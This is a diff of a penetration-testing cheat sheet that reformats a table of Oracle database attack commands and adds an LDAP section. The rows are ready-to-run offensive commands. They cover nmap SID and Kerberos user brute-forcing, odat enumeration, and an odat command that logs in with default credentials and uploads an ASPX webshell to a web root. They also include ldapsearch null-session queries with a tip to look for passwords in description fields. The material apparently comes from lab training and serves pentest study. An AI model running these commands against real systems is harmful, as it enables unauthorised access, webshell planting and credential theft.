@@ -264,11 +264,19 @@ Caveat: The authorized_keys file might not work if it’s writable by other user
 
 > We can use `dbeaver` app to connect any database through GUI
 
-|**Command**|**Description**|
-|-|-|
-| `sudo nmap -p1521 -sV 10.129.204.235 --open` | Nmap port scanning |
-| `sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute` | Nmap SID bruteforcing |
-| `sudo odat all -s <FQDN/IP> --output-file scripts/odat-enumeration` | Perform a variety of scans to gather information about the Oracle database services and its components. |
-| `sqlplus <user>/<pass>@<FQDN/IP>/<db>` | Log in to the Oracle database. |
-| `select table_name from all_tables;` | SQLPlus: query all tables |
-| `/opt/odat/odat.py utlfile -s 10.129.36.208 -p 1521 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx cmdasp.aspx`<br/>`go to http://10.129.36.208/shell.aspx` | Upload a webshell. |
+| **Command**                                                                                                                                                                             | **Description**                                                                                         |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
+| `sudo nmap -p1521 -sV 10.129.204.235 --open`                                                                                                                                            | Nmap port scanning                                                                                      |
+| `sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute`                                                                                                                  | Nmap SID bruteforcing                                                                                   |
+| `sudo odat all -s <FQDN/IP> --output-file scripts/odat-enumeration`                                                                                                                     | Perform a variety of scans to gather information about the Oracle database services and its components. |
+| `sqlplus <user>/<pass>@<FQDN/IP>/<db>`                                                                                                                                                  | Log in to the Oracle database.                                                                          |
+| `select table_name from all_tables;`                                                                                                                                                    | SQLPlus: query all tables                                                                               |
+| `/opt/odat/odat.py utlfile -s 10.129.36.208 -p 1521 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx cmdasp.aspx`<br/>`go to http://10.129.36.208/shell.aspx` | Upload a webshell.                                                                                      |
+##### **[LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)** (TCP 389,636,3268,3269)
+
+| **Command**                                                                                                                                        | **Description**                                                                                     |
+| -------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
+| `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.214.122" "(objectclass=*)"`                                                           | Ldapsearch null session (Do not forget to check description fields, we can find passwords in there) |
+| `ldapsearch -h <IP ADDRESS> -p 389 -x -s base -b '' "(objectClass=*)" "*" +`                                                                       | Ldapsearch null session 2                                                                           |
+| `nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/seclists/Usernames/Names/names.txt <IP>` | Nmap - Kerberos bruteforcing                                                                        |
+| `nmap -p389 --script=ldap-search <IP>`                                                                                                             | Nmap - possible users and hashes                                                                    |
